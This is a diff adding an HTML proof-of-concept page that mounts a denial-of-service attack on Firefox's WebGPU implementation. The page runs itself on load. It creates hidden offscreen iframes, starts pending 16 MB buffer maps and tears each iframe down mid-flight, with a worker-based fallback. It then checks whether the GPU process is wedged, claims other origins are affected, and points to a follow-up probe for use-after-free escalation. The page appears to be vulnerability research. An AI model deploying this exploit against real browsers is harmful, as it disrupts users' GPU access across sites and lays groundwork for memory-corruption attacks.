@@ -1,0 +1,248 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>WebGPU Mapped-Buffer Teardown DoS — sn0x</title>
+<style>
+  body { font: 14px/1.6 monospace; background: #0d0d0d; color: #0f0; margin: 20px; }
+  h1 { color: #ff6; font-size: 16px; }
+  .ok { color: #0f0; } .fail { color: #f00; } .warn { color: #ff0; } .info { color: #0cf; }
+  #log { white-space: pre-wrap; }
+  button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 6px 14px; cursor: pointer; margin: 4px; }
+</style>
+<h1>WebGPU Mapped-Buffer Teardown DoS</h1>
+<p>Runs automatically. Check the log below.</p>
+<button onclick="runDoS()">Run DoS Again</button>
+<button onclick="checkWedge()">Check WebGPU State</button>
+<div id="log"></div>
+
+<script>
+const log = document.getElementById('log');
+let lineCount = 0;
+
+function appendLog(msg, cls = '') {
+  lineCount++;
+  const ts = new Date().toISOString().slice(11, 23);
+  log.innerHTML += `<span class="${cls}">[${ts}] ${msg}\n</span>`;
+  log.scrollTop = log.scrollHeight;
+}
+
+function logOk(m)   { appendLog(m, 'ok');   console.log(m); }
+function logFail(m) { appendLog(m, 'fail'); console.error(m); }
+function logWarn(m) { appendLog(m, 'warn'); console.warn(m); }
+function logInfo(m) { appendLog(m, 'info'); console.info(m); }
+
+// --- Baseline: confirm WebGPU is available pre-attack ---
+async function baselineCheck() {
+  logInfo('=== BASELINE CHECK ===');
+  if (!navigator.gpu) {
+    logFail('navigator.gpu is undefined — WebGPU not available in this Firefox build/version. Enable via about:config: dom.webgpu.enabled=true');
+    return false;
+  }
+  const t0 = performance.now();
+  const adapter = await Promise.race([
+    navigator.gpu.requestAdapter(),
+    new Promise(r => setTimeout(() => r('TIMEOUT'), 4000))
+  ]);
+  const elapsed = (performance.now() - t0).toFixed(0);
+  if (adapter === 'TIMEOUT') {
+    logWarn(`Baseline ALREADY slow (>4s) — WebGPU may already be wedged or unavailable`);
+    return false;
+  }
+  if (!adapter) {
+    logWarn('requestAdapter() returned null at baseline — no GPU adapter found');
+    return false;
+  }
+  logOk(`Baseline requestAdapter() OK in ${elapsed}ms`);
+  return true;
+}
+
+// --- Core attack: N iframes each start a mapAsync then are immediately removed ---
+async function triggerDoS(iterations = 30) {
+  logInfo(`=== TRIGGERING DoS: ${iterations} iframes ===`);
+  let successCount = 0;
+  let failCount = 0;
+
+  for (let i = 0; i < iterations; i++) {
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;';
+    document.body.appendChild(iframe);
+
+    try {
+      const win = iframe.contentWindow;
+      if (!win || !win.navigator || !win.navigator.gpu) {
+        document.body.removeChild(iframe);
+        failCount++;
+        continue;
+      }
+
+      const adapterPromise = win.navigator.gpu.requestAdapter();
+      const adapter = await Promise.race([
+        adapterPromise,
+        new Promise(r => setTimeout(() => r(null), 1500))
+      ]);
+
+      if (!adapter) {
+        document.body.removeChild(iframe);
+        failCount++;
+        continue;
+      }
+
+      const devicePromise = adapter.requestDevice();
+      const device = await Promise.race([
+        devicePromise,
+        new Promise(r => setTimeout(() => r(null), 1500))
+      ]);
+
+      if (!device) {
+        document.body.removeChild(iframe);
+        failCount++;
+        continue;
+      }
+
+      // Create a large mappable buffer
+      const buf = device.createBuffer({
+        size: 16 * 1024 * 1024, // 16 MB
+        usage: win.GPUBufferUsage.MAP_READ | win.GPUBufferUsage.COPY_DST,
+        mappedAtCreation: false,
+      });
+
+      // Fire off the map — DO NOT await — leave it pending
+      buf.mapAsync(win.GPUMapMode.READ).catch(() => {});
+
+      // Immediately destroy the iframe while the map is in-flight
+      // This destroys the content-side device/buffer while GPU process still has pending work
+      document.body.removeChild(iframe);
+      successCount++;
+
+    } catch (e) {
+      try { document.body.removeChild(iframe); } catch {}
+      failCount++;
+      if (i < 3) logWarn(`Iteration ${i} exception: ${e.message}`);
+    }
+
+    // Small yield to let FF process some IPC — keeps UI from freezing
+    if (i % 5 === 4) {
+      await new Promise(r => setTimeout(r, 0));
+    }
+  }
+
+  logInfo(`DoS iterations: ${successCount} successful, ${failCount} failed/skipped`);
+  return successCount;
+}
+
+// --- Post-attack check: is requestAdapter() now hanging? ---
+async function checkWedge() {
+  logInfo('=== CHECKING WEBGPU STATE POST-ATTACK ===');
+  const TIMEOUT_MS = 6000;
+  const t0 = performance.now();
+
+  const result = await Promise.race([
+    navigator.gpu.requestAdapter().then(a => ({ adapter: a, hung: false })),
+    new Promise(r => setTimeout(() => r({ adapter: null, hung: true }), TIMEOUT_MS))
+  ]);
+
+  const elapsed = (performance.now() - t0).toFixed(0);
+
+  if (result.hung) {
+    logFail(`✓ BUG CONFIRMED: requestAdapter() HUNG for >${TIMEOUT_MS}ms`);
+    logFail(`  WebGPU is WEDGED. Other origins sharing this GPU process are also affected.`);
+    return 'WEDGED';
+  }
+  if (!result.adapter) {
+    logWarn(`requestAdapter() returned null after ${elapsed}ms — adapter lost`);
+    return 'NULL';
+  }
+  logOk(`requestAdapter() returned adapter in ${elapsed}ms — WebGPU not wedged`);
+
+  // Try actually creating a device too
+  try {
+    const device = await Promise.race([
+      result.adapter.requestDevice(),
+      new Promise(r => setTimeout(() => r(null), 3000))
+    ]);
+    if (!device) {
+      logFail(`✓ PARTIAL: requestAdapter() OK but requestDevice() hung/returned null`);
+      return 'DEVICE_HUNG';
+    }
+    logOk(`requestDevice() also OK — WebGPU fully functional`);
+    device.destroy();
+  } catch (e) {
+    logFail(`requestDevice() threw: ${e.message}`);
+    return 'DEVICE_ERROR';
+  }
+
+  return 'OK';
+}
+
+// --- Worker variant: trigger via SharedWorker / Worker instead of iframe ---
+async function triggerDoSWorker(n = 20) {
+  logInfo(`=== WORKER VARIANT: ${n} workers ===`);
+  const workerCode = `
+    self.onmessage = async () => {
+      try {
+        const adapter = await navigator.gpu?.requestAdapter();
+        if (!adapter) { self.postMessage({ok: false, reason: 'no adapter'}); return; }
+        const device = await adapter.requestDevice();
+        const buf = device.createBuffer({
+          size: 8 * 1024 * 1024,
+          usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
+        });
+        buf.mapAsync(GPUMapMode.READ).catch(() => {});
+        // Don't wait — terminate immediately after firing
+        self.postMessage({ok: true});
+      } catch(e) {
+        self.postMessage({ok: false, reason: e.message});
+      }
+    };
+  `;
+  const blob = new Blob([workerCode], { type: 'text/javascript' });
+  const url = URL.createObjectURL(blob);
+
+  const promises = [];
+  for (let i = 0; i < n; i++) {
+    promises.push(new Promise(resolve => {
+      const w = new Worker(url);
+      w.onmessage = e => { w.terminate(); resolve(e.data); };
+      w.onerror = () => { w.terminate(); resolve({ ok: false, reason: 'worker error' }); };
+      w.postMessage('go');
+    }));
+  }
+
+  const results = await Promise.all(promises);
+  const ok = results.filter(r => r.ok).length;
+  logInfo(`Worker variant: ${ok}/${n} workers fired map+terminate`);
+  URL.revokeObjectURL(url);
+  return ok;
+}
+
+// --- Main flow ---
+async function runDoS() {
+  log.innerHTML = '';
+  lineCount = 0;
+
+  const baseline = await baselineCheck();
+  if (!baseline) return;
+
+  logInfo('Starting iframe-based DoS...');
+  const fired = await triggerDoS(30);
+  if (fired < 5) {
+    logWarn('Too few iterations succeeded — trying worker variant...');
+    await triggerDoSWorker(20);
+  }
+
+  // Brief pause to let the GPU process settle (or wedge)
+  await new Promise(r => setTimeout(r, 500));
+
+  const state = await checkWedge();
+
+  logInfo('');
+  if (state === 'WEDGED' || state === 'DEVICE_HUNG' || state === 'NULL') {
+    logFail('=== RESULT: WebGPU DoS CONFIRMED ===');
+    logFail('Next step: run webgpu_uaf_probe.html to probe for escalation paths');
+  } else {
+    logWarn('=== RESULT: WebGPU not wedged by this run ===');
+    logWarn('Try increasing iteration count or switching to worker variant');
+  }
+}
+
+runDoS();
+</script>
